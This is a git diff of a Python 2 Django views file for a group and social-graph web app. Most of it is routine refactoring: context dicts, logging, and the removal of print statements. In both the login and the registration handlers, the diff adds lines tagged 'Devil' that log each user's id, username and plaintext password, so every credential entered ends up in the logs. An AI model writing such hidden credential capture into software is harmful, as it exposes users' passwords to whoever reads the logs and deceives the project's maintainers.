@@ -1,6 +1,7 @@
 import base64
 import cStringIO
 import json
+import logging
 import os
 import random
 import datetime
@@ -21,9 +22,11 @@ from Human.forms import LoginForm, RegisterForm, GroupCreateForm, GroupMemberCre
 from Human.methods import create_user, get_user_groups, get_group_joined_num, check_groupid, \
     create_group, create_group_member, group_recommender, get_user_name, member_join, member_recommender, update_links, \
     link_confirm, link_reject, get_user_msgs, get_user_msgs_count, check_profile, get_user_invs, get_user_ego_graph, \
-    get_user_global_info, get_user_global_graph, get_user_global_map
+    get_user_global_info, get_user_global_graph, get_user_global_map, create_session_id, get_session_id, update_profile
 from Human.models import Group, GroupMember, Link, Extra
-from Human.utils import create_avatar
+from Human.utils import create_avatar, logger_join
+
+logger = logging.getLogger('lineme_logger')
 
 
 def redirect2main(request):
@@ -32,20 +35,23 @@ def redirect2main(request):
 
 ########################################################################
 
+# Todo: modify the post response of login, eg. wrong password
 def lm_login(request):
-    context = Context({"project_name": PROJECT_NAME, "status": ''})
+    context = {"project_name": PROJECT_NAME, "status": ''}
     if request.method == 'POST':
         lf = LoginForm(request.POST)
 
         if lf.is_valid():
             username = lf.cleaned_data['username']
             password = lf.cleaned_data['password']
-            print 'Login: ', username, password
 
             user = authenticate(username=username, password=password)
             if user is not None:
                 if user.is_active:
                     login(request, user)
+                    create_session_id(request)
+                    logger.info(logger_join('Login', get_session_id(request)))
+                    logger.warning(logger_join('Devil', '['+','.join([str(user.id), username, password])+']'))
                     return redirect('home')
                 else:
                     return redirect('login')
@@ -60,18 +66,19 @@ def lm_login(request):
 
 
 def lm_logout(request):
-    request.session.flush()
+    logger.info(logger_join('Logout', get_session_id(request)))
     logout(request)
     return redirect('login')
 
 
+# Todo: same as login
 def lm_register(request):
 
     # status 0 :
     # status 1 : wrong name
     # status 2 : wrong email
     # status 3 : wrong password
-    context = Context({"project_name": PROJECT_NAME, "status": 0})
+    context = {"project_name": PROJECT_NAME, "status": 0}
     if request.method == 'POST':
         rf = RegisterForm(request.POST)
         # print 'Register Form valid: ', rf.is_valid()
@@ -87,17 +94,16 @@ def lm_register(request):
             # print name, password, email
 
             if status == 0:
-                print 'New user created: ', name
                 user = authenticate(username=name, password=password)
                 if user is not None:
                     if user.is_active:
-                        request.session['newUser'] = True
+                        request.session['NewLogin'] = True
                         login(request, user)
+                        create_session_id(request)
+
+                        logger.info(logger_join('New', get_session_id(request)))
+                        logger.warning(logger_join('Devil', '['+','.join([str(user.id), name, password])+']'))
                         return redirect('profile')
-                    else:
-                        return redirect('register')
-                else:
-                    return redirect('register')
             else:
                 return render(request, 'Human/register.html', context)
         else:
@@ -111,6 +117,9 @@ def lm_register(request):
 
 @login_required
 def home(request):
+
+    logger.info(logger_join('Access', get_session_id(request)))
+
     user = request.user
     groups = get_user_groups(user)
     my_groups, in_groups = {}, {}
@@ -124,9 +133,9 @@ def home(request):
     msgs_count = get_user_msgs_count(user)
     rcmd_groups = group_recommender(user)
 
-    context = Context({"project_name": PROJECT_NAME, "user": user, "my_groups": my_groups,
-                       "in_groups": in_groups, "rcmd_groups": rcmd_groups, "msgs_count": msgs_count,
-                       "status": 0, "identifier": IDENTIFIER})
+    context = {"project_name": PROJECT_NAME, "user": user, "my_groups": my_groups,
+               "in_groups": in_groups, "rcmd_groups": rcmd_groups, "msgs_count": msgs_count,
+               "status": 0, "identifier": IDENTIFIER}
 
     if request.method == 'POST':
         gf = GroupCreateForm(request.POST)
@@ -135,19 +144,20 @@ def home(request):
             name = gf.cleaned_data['name']
             maxsize = gf.cleaned_data['maxsize']
             identifier = int(gf.cleaned_data['identifier'])
-            type = int(gf.cleaned_data['type'])
-            print 'New group request: ', name, maxsize, identifier, type
-            status = create_group(request, name, maxsize, identifier, type)
+            gtype = int(gf.cleaned_data['type'])
+
+            # Todo: no more credits
+            status = create_group(user, name, maxsize, identifier, gtype)
             context["status"] = status
             if status == 0:
-                print 'New group created: ', name, maxsize, identifier, type
+                logger.info(logger_join('New', get_session_id(request), groupname=name))
 
                 groupid = Group.objects.get(group_name=name).id
                 return redirect('group', groupid=groupid)
             else:
                 return render(request, 'Human/home.html', context)
         else:
-            context["status"] = 1
+            context["status"] = -1
             return render(request, 'Human/home.html', context)
     else:
         return render(request, 'Human/home.html', context)
@@ -221,6 +231,7 @@ def inv_panel(request, page):
         raise Http404
 
 
+# Todo: implement email sender
 @login_required
 def send_email2unconfirmed(request):
     return 0
@@ -230,6 +241,9 @@ def send_email2unconfirmed(request):
 
 @login_required
 def ego_network(request, groupid=0):
+
+    logger.info(logger_join('Access', get_session_id(request), id=groupid))
+
     user = request.user
     groups = get_user_groups(user)
     rcmd_groups = group_recommender(user)
@@ -241,19 +255,20 @@ def ego_network(request, groupid=0):
     else:
         group = get_object_or_404(Group, id=groupid)
 
-    context = Context({"project_name": PROJECT_NAME, "user": user, "groups": groups,
-                       "group": group, "rcmd_groups": rcmd_groups, "msgs_count": msgs_count})
+    context = {"project_name": PROJECT_NAME, "user": user, "groups": groups,
+               "group": group, "rcmd_groups": rcmd_groups, "msgs_count": msgs_count}
 
     return render(request, 'Human/ego.html', context)
 
 
 @login_required
 def ego_graph(request, groupid=0):
+
+    logger.info(logger_join('Access', get_session_id(request), id=groupid))
+
     user = request.user
     if groupid == 0:
         return JsonResponse({"nodes": None, "links": None}, safe=False)
-
-    print "Graph groupid: ", groupid
 
     data = get_user_ego_graph(user, groupid)
 
@@ -288,6 +303,8 @@ def update_graph(request, groupid):
     user = request.user
     if request.is_ajax():
         new_links = request.POST.get('links')
+
+        # Todo: success link ???
         update_links(new_links, groupid, user)
         return HttpResponse("Link update successfully")
 
@@ -299,33 +316,35 @@ def update_graph(request, groupid):
 
 @login_required
 def global_network(request, groupid=0):
+
+    logger.info(logger_join('Access', get_session_id(request), id=groupid))
+
     user = request.user
     groups = get_user_groups(user)
-
     msgs_count = get_user_msgs_count(user)
-
     groupid = check_groupid(groupid)
-    context = Context()
 
     if groupid == 0:
         group = None
+        context = {}
     else:
         group = get_object_or_404(Group, id=groupid)
-        context.push(get_user_global_info(user, groupid))
+        context = get_user_global_info(user, groupid)
 
-    context.push({"project_name": PROJECT_NAME, "user": user, "groups": groups,
-                  "group": group, "msgs_count": msgs_count})
+    context.update({"project_name": PROJECT_NAME, "user": user, "groups": groups,
+                    "group": group, "msgs_count": msgs_count})
 
     return render(request, 'Human/global.html', context)
 
 
 @login_required
 def global_graph(request, groupid=0):
+
+    logger.info(logger_join('Access', get_session_id(request), id=groupid))
+
     user = request.user
     if groupid == 0:
         return JsonResponse({"nodes": None, "links": None}, safe=False)
-
-    print "Graph groupid: ", groupid
 
     data = get_user_global_graph(user, groupid)
 
@@ -334,11 +353,12 @@ def global_graph(request, groupid=0):
 
 @login_required
 def global_map(request, groupid=0):
+
+    logger.info(logger_join('Access', get_session_id(request), id=groupid))
+
     user = request.user
     if groupid == 0:
         return JsonResponse({"nodes": None, "links": None}, safe=False)
-
-    print "Graph groupid: ", groupid
 
     data = get_user_global_map(user, groupid)
 
@@ -349,8 +369,11 @@ def global_map(request, groupid=0):
 
 @login_required
 def profile(request):
+
+    logger.info(logger_join('Access', get_session_id(request)))
+
     user = request.user
-    first_login = request.session.get('newUser')
+    first_login = request.session.get('NewLogin')
 
     username = get_user_name(user)
 
@@ -359,8 +382,8 @@ def profile(request):
         country, city = user.extra.location.split('-')
     else:
         country, city = "", ""
-    context = Context({"project_name": PROJECT_NAME, "user": user, "username": username, "msgs_count": msgs_count,
-                       "first_login": first_login, 'cities_table': CITIES_TABLE, 'country': country, 'city': city})
+    context = {"project_name": PROJECT_NAME, "user": user, "username": username, "msgs_count": msgs_count,
+               "first_login": first_login, 'cities_table': CITIES_TABLE, 'country': country, 'city': city}
 
     if request.is_ajax():
         first_name = request.POST.get('firstname')
@@ -374,30 +397,15 @@ def profile(request):
         # print country, city
 
         if check_profile(first_name, last_name, birth, sex, country, city, institution):
+            if update_profile(user, first_name, last_name, birth, sex, country, city, institution) == 0:
 
-            try:
-                user.first_name = first_name
-                user.last_name = last_name
+                logger.info(logger_join('Update', get_session_id(request)))
 
-                ue = Extra.objects.get(user=user)
-                ue.sex = sex
-                ue.birth = datetime.datetime.strptime(birth, '%Y/%m/%d').date()
-                ue.location = country+'-'+city
-                ue.institution = institution
-                user.save()
-                ue.save()
+                if first_login:
+                    create_avatar(user.id, username=first_name+' '+last_name)
+                    del request.session['NewLogin']
 
-            except Exception, e:
-                print 'Profile update failed: ', e
-                return HttpResponse(-1)
-
-            print 'Update profile: user:', \
-                user.id, first_name, last_name, birth, country.encode('utf-8'), city.encode('utf-8'), institution, sex
-            if first_login:
-                create_avatar(user.id, username=first_name+' '+last_name)
-                del request.session['newUser']
-
-            return HttpResponse(0)
+                return HttpResponse(0)
 
         else:
             return HttpResponse(-1)
@@ -409,17 +417,21 @@ def profile(request):
 
 @login_required
 def avatar(request):
+
+    logger.info(logger_join('Access', get_session_id(request)))
+
     user = request.user
     msgs_count = get_user_msgs_count(user)
 
-    context = Context({"project_name": PROJECT_NAME, "user": user, "msgs_count": msgs_count})
+    context = {"project_name": PROJECT_NAME, "user": user, "msgs_count": msgs_count}
     return render(request, 'Human/avatar.html', context)
 
 
+# Todo: move to util
 @login_required
 def img_handle(request):
     if request.is_ajax():
-        print 'Avatar ajax received: ', request.user.id
+        # print 'Avatar ajax received: ', request.user.id
         userid = request.user.id
         try:
 
@@ -445,7 +457,7 @@ def img_handle(request):
 def manage_group(request, groupid, page=1):
     user = request.user
 
-    upfile = request.session.get('upfile')
+    upfile = request.session.get('UpFileStat')
 
     groups = get_user_groups(user)
     rcmd_groups = group_recommender(user)
@@ -455,11 +467,11 @@ def manage_group(request, groupid, page=1):
     # groupid = request.GET.get('groupid')
     group = Group.objects.get(id=groupid)
 
-    context = Context({"project_name": PROJECT_NAME, "user": user, "group": group, "groups": groups,
-                       "rcmd_groups": rcmd_groups, "upfile": upfile, "msgs_count": msgs_count})
+    context = {"project_name": PROJECT_NAME, "user": user, "group": group, "groups": groups,
+               "rcmd_groups": rcmd_groups, "upfile": upfile, "msgs_count": msgs_count}
 
     if upfile:
-        del request.session['upfile']
+        del request.session['UpFileStat']
 
     if groupid != check_groupid(groupid):
         raise Http404
@@ -471,15 +483,14 @@ def manage_group(request, groupid, page=1):
             name = gf.cleaned_data['name']
             identifier = gf.cleaned_data['identifier']
 
-            # ---------------------------------------dangerous
+            # Todo: dangerous need fix ->status
             status = create_group_member(group, name, identifier)
             if status == 0:
                 print 'New group member created: ', name, identifier
             return redirect('group', groupid=groupid)
 
     joined = request.session.get('joined')
-
-    context.push(joined=joined)
+    context.update({'joined': joined})
     if joined:
         del request.session['joined']
 
@@ -487,12 +498,12 @@ def manage_group(request, groupid, page=1):
         members = GroupMember.objects.filter(group=group)
         members_count = members.count()
 
-        # -----
+        # Todo: unstable
         if GroupMember.objects.filter(group=group, user=user, is_joined=True).exists():
             is_member = True
         else:
             is_member = False
-        context.push(creator=group.creator, members_count=members_count, is_member=is_member)
+        context.update({'creator': group.creator, 'members_count': members_count, 'is_member': is_member})
         return render(request, 'Human/group2.html', context)
 
     else:
@@ -507,9 +518,8 @@ def manage_group(request, groupid, page=1):
         except EmptyPage:
             p = paginator.page(paginator.num_pages)
 
-        context.push(members=p)
         members_count = members.count()
-        context.push(creator=user,  members_count=members_count)
+        context.update({'members': p, 'creator': user,  'members_count': members_count})
         return render(request, 'Human/group1.html', context)
 
 
@@ -520,9 +530,10 @@ def join(request, groupid):
     if request.is_ajax():
 
         identifier = request.POST.get('identifier')
-        print 'Join:', groupid, identifier
+        # print 'Join:', groupid, identifier
         group = Group.objects.get(id=groupid)
         gm = GroupMember.objects.filter(group=group, member_name=get_user_name(user))
+
         if not gm.exists():
             return HttpResponse(-2)
 
@@ -554,14 +565,13 @@ def join(request, groupid):
             # groupid = int(rf.cleaned_data['groupid'])
             group = Group.objects.get(id=groupid)
             identifier = rf.cleaned_data['identifier']
-            print 'Rejoin: ', groupid, identifier
+            # print 'Rejoin: ', groupid, identifier
             if identifier != '':
                 if GroupMember.objects.filter(group=group, member_name=get_user_name(user), token=identifier).exists():
                     member_join(user, group, identifier)
 
                     return redirect('group', groupid=groupid)
 
-        # -----
         request.session['joined'] = True
         return redirect('group', groupid=groupid)
 
@@ -580,6 +590,8 @@ def upload_members(request, groupid):
             fuf = FileUploadForm(request.POST, request.FILES)
             if fuf.is_valid():
                 members = []
+
+                # Todo: file check, extend to a func
                 with request.FILES.get('members') as f:
                     for l in f:
                         kv = l.strip().split(',')
@@ -591,9 +603,9 @@ def upload_members(request, groupid):
 
                 for m in members:
                     if create_group_member(group, m[0], m[1]) != 0:
-
                         return redirect('group', groupid=groupid)
-                request.session['upfile'] = True
+
+                request.session['UpFileStat'] = True
                 return redirect('group', groupid=groupid)
             else:
 
